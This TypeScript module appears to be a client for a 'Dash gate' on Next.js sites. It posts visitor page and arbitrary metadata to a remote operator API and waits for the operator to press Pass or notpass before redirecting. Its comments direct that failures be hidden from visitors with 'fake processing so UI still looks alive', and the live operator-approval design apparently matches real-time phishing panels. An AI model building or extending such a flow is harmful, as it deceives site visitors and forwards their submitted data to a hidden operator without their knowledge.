// Dash gate client for Next.js sites.
// Env: NEXT_PUBLIC_DASH_API_BASE="https://YOUR-DASH.vercel.app" (empty = same origin)
export function dashBase(): string {
  const b = (process.env.NEXT_PUBLIC_DASH_API_BASE || '').replace(/\/$/, '');
  return b;
}

export type Decision = 'pass' | 'notpass';

export async function createDashSession(args: {
  siteId: string;
  page: string;
  meta?: Record<string, unknown>;
  redirectHint?: string;
}): Promise<string | null> {
  try {
    const r = await fetch(`${dashBase()}/api/create-session`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        siteId: args.siteId,
        page: args.page,
        meta: args.meta || {},
        redirectHint: args.redirectHint || '',
      }),
    });
    const j = await r.json();
    return j.id || null;
  } catch {
    return null;
  }
}

export async function pollDashSession(
  id: string,
  opts?: { intervalMs?: number; timeoutMs?: number }
): Promise<{ status: Decision | 'timeout'; redirectUrl?: string }> {
  const intervalMs = opts?.intervalMs ?? 2000;
  const timeoutMs = opts?.timeoutMs ?? 180000;
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const r = await fetch(`${dashBase()}/api/poll-session?id=${encodeURIComponent(id)}`);
      const j = await r.json();
      if (j.status === 'pass') return { status: 'pass', redirectUrl: j.redirectUrl };
      if (j.status === 'notpass') return { status: 'notpass' };
    } catch {
      // keep polling; network blips must not surface errors to the visitor
    }
    await new Promise((res) => setTimeout(res, intervalMs));
  }
  return { status: 'timeout' };
}

// One call: create + block in loading state until operator decides.
// Returns 'pass' only when operator pressed Pass. Every other outcome
// ('notpass' / 'timeout' / create-fail) must silently reset the button.
export async function requestDashApproval(args: {
  siteId: string;
  page: string;
  meta?: Record<string, unknown>;
  redirectHint?: string;
  intervalMs?: number;
  timeoutMs?: number;
}): Promise<Decision> {
  const id = await createDashSession(args);
  if (!id) {
    // Fail silently: brief fake processing so UI still looks alive, then reset.
    await new Promise((res) => setTimeout(res, 1500));
    return 'notpass';
  }
  const out = await pollDashSession(id, { intervalMs: args.intervalMs, timeoutMs: args.timeoutMs });
  return out.status === 'pass' ? 'pass' : 'notpass';
}
